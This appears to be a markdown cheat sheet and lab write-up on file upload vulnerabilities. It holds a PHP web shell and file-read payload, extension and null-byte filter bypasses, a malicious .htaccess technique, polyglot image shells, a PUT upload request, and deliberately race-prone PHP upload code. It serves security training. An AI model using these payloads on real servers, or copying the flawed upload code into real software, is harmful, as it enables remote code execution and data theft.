<h1>Payloads - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>PHP</h2>

**File Retrieval**

```<?php echo file_get_contents('/path/to/file'); ?>```

**Dynamic Web Shell**

```<?php echo system($_GET['command']); ?>```


Use the shell like this ```GET /example/exploit.php?command=id HTTP/1.1```

**Reverse Shell**

See https://www.revshells.com for a reverse shell generator

**File Extension Obfuscation Techniques**

<ul>
  <li>Malicious .httpaccess File Upload</li>
  <li>Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: exploit.php.jpg</li>
  <li>Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: exploit.php.</li>
  <li>Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: exploit%2Ephp</li>
  <li>Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.asp;.jpg or exploit.asp%00.jpg</li>
  <li>Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.</li>
</ul>

<h1>Proof Of Concepts - FOR EDUCATIONAL PURPOSES ONLY</h1>

Various proof of concepts for file upload attacks. All data is from a lab environment.

<h2>No Protections</h2>

In this lab environment, there are no protections against file upload attacks. We are able to upload a php web shell and achieve remote code execution by requesting the file.

<img width="1413" height="600" alt="file-upload-no-protections-1" src="https://github.com/user-attachments/assets/aa9ed633-d369-41cd-865b-a4587a031aaf" />

<img width="1421" height="605" alt="file-upload-no-protections-2" src="https://github.com/user-attachments/assets/17df9a2a-c346-4e0c-b5ce-c943eb4b07a0" />

<h2>Bypass File-Type Allow List - Request Manipulation</h2>

If the server only allows certain file types, sometimes you can bypass this restriction by manipulating the Content-Type

<img width="1417" height="601" alt="file-upload-content-type-manipulation-failed-upload" src="https://github.com/user-attachments/assets/c90a9861-09da-4be3-aaed-ab1f2da82c26" />

<img width="1415" height="601" alt="file-upload-content-type-manipulation-successful-upload" src="https://github.com/user-attachments/assets/a8ebf1e7-5429-4363-b9dc-b9812bb9af2f" />

<img width="1415" height="600" alt="file-upload-content-type-manipulation-successful-command-execution" src="https://github.com/user-attachments/assets/dfff27e2-3533-43a5-8b0c-094b8400ffbc" />

<h2>Uploaded Files Served As Plain Text</h2>

Sometimes the server might serve your uploaded file as plain text in an attempt to protect the server against file upload attacks. The upload directory has strict security, but we might be able to upload our file to a
different directory via a path traversal in the filename.

**Uploaded Files Served As Plain Text**

<img width="1415" height="601" alt="uploaded-files-served-as-plain-text-1" src="https://github.com/user-attachments/assets/f66c4652-5c71-431f-bfc5-9ec6d5057b67" />

<img width="1419" height="602" alt="uploaded-files-served-as-plain-text-2" src="https://github.com/user-attachments/assets/dc626f5a-fb5e-415b-b0c2-21d352da7966" />

**Bypassed By Using Path Traversal To Upload Files To Different Directory**

<img width="1414" height="605" alt="path-traversal-to-upload-file-to-different-directory-1" src="https://github.com/user-attachments/assets/1597436b-7da1-451d-b8f2-7b761bb38ab6" />

<img width="1417" height="603" alt="path-traversal-to-upload-file-to-different-directory-2" src="https://github.com/user-attachments/assets/d909ade1-406f-461c-a26f-ef52ab4e32cd" />

<h2>File Extension Restriction</h2>

Sometimes, the file extension is black listed (.php, .aspx, etc). In this case, we might be able to bypass this by finding an alternative file extension. We might also be able to upload an .htaccess file. The .htaccess
file tells the server what file extensions are allowed. The .htaccess can also be used to map a custom file extensions to other extensions.

The following Lab restricts the .php file extension until we upload our own .htaccess that tells the server to map the .l33t extensions to the Content-Type application/x-httpd-php. We can then upload our own .l33t file
and achieve command execution.

**Original Restriction Of the .php Extension**

<img width="1420" height="633" alt="php-file-extension-restricted" src="https://github.com/user-attachments/assets/218b70bd-3efd-45b1-aaaa-f30a99a9822f" />


**Uploading Our Malicious .htaccess File**

<img width="1413" height="629" alt="uploading-our-malicious-httpaccess-file" src="https://github.com/user-attachments/assets/75e060fd-8978-4663-95fd-a0d2e7f561e2" />

**Uploading Our .l33t File With PHP Content-Type**

<img width="1415" height="627" alt="uploading-the-l33t-file-with-php-content-type" src="https://github.com/user-attachments/assets/eb8398ae-396b-43c5-b0cf-3ff10efe248b" />

**Successful Command Execution**

<img width="1408" height="632" alt="successful-command-execution-after-malicious-httpaccess-upload" src="https://github.com/user-attachments/assets/1b76319c-89b4-4114-8e50-635428a68382" />

<h2>File Extension Obfuscation</h2>

Sometimes, you can bypass restrictions by obfuscating the file extension.

<img width="1413" height="636" alt="file-extension-obfuscation-1" src="https://github.com/user-attachments/assets/20eacfc5-b3b7-47cc-9cc9-f62c1562e452" />

<img width="1415" height="638" alt="file-extension-obfuscation-2" src="https://github.com/user-attachments/assets/ebc02d0c-9e80-45b8-903b-620ad681fe1e" />

<h2>Polyglot JPG/PHP File To Bypass File Content Restrictions</h2>

Sometimes the server will restrict your file based upon the content. Server might rely on the Magic Bytes (specific hex signature) for an image file in order to verify that the file is an image. This can sometimes be
bypassed by uploading a polyglot image/php file. In the following lab, we will create and upload a polyglot JPG/PHP file with a php webshell embedded in the image metadata.

<img width="1800" height="565" alt="adding-web-shell-to-image-metadata-using-exiftool-for-educational-purposes-only" src="https://github.com/user-attachments/assets/b130b021-2b2a-4a86-b247-b07115d9277b" />

<img width="1421" height="448" alt="uploading-the-polyglot-image-php-file" src="https://github.com/user-attachments/assets/f549d6e1-81d6-4953-b440-005fe5b07ee9" />

<img width="1414" height="632" alt="successful-command-execution-from-polyglot-image-php-file" src="https://github.com/user-attachments/assets/4ba5e32e-732d-4716-997b-4331be666271" />

<h2>Race Condition In Virus Check</h2>

Sometimes, the server will have custom configurations to allow for their custom processing of your uploaded files. For example, the server might conduct a virus check on your files to verify whether the file is malicious or
not. Depending on the configuration, this could lead to a race condition. If we upload the file multiple times and request the file multiple times, and send all these requests in parallel (nearly simultaneously) the server
won't have enough time to check if the file is malicious. This timeframe creates a race condition, allowing you to request malicious files before the virus check finishes.

The below code creates a Race Condition in the lab

```
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

<img width="1412" height="725" alt="file-upload-race-condition-1" src="https://github.com/user-attachments/assets/f9f6bfef-21d6-4aaa-8328-bf8dfbe5f7d8" />

<img width="1419" height="724" alt="file-upload-race-condition-2" src="https://github.com/user-attachments/assets/7bd502c4-071d-42af-8f1c-75588ca0e471" />

<img width="1414" height="727" alt="file-upload-race-condition-3" src="https://github.com/user-attachments/assets/9973b819-53b2-4910-ba84-9a23716be13a" />

<img width="1412" height="720" alt="file-upload-race-condition-4" src="https://github.com/user-attachments/assets/7cf6f5c4-3754-435c-badd-0e57e75e536a" />

**Race conditions in URL-based file uploads**

Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.

As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.

For example, if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's uniqid(), it can potentially be brute-forced.

To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.

<h1>File Upload Vulnerabilities Without Remote Command Execution</h1>

<h2>Uploading malicious client-side scripts</h2>

If the server allows you to upload HTML or SVG files, you might be able to upload a malicious script to achieve stored xss.

<h2>Exploiting vulnerabilities in the parsing of uploaded files</h2>

If the server allows you to upload XML files, such as .doc or .xls files, this may be a potential vector for XXE Injection

<h2>Uploading files using PUT</h2>

Some web servers may be configured to support PUT requests

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

<mark>You can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method.</mark>
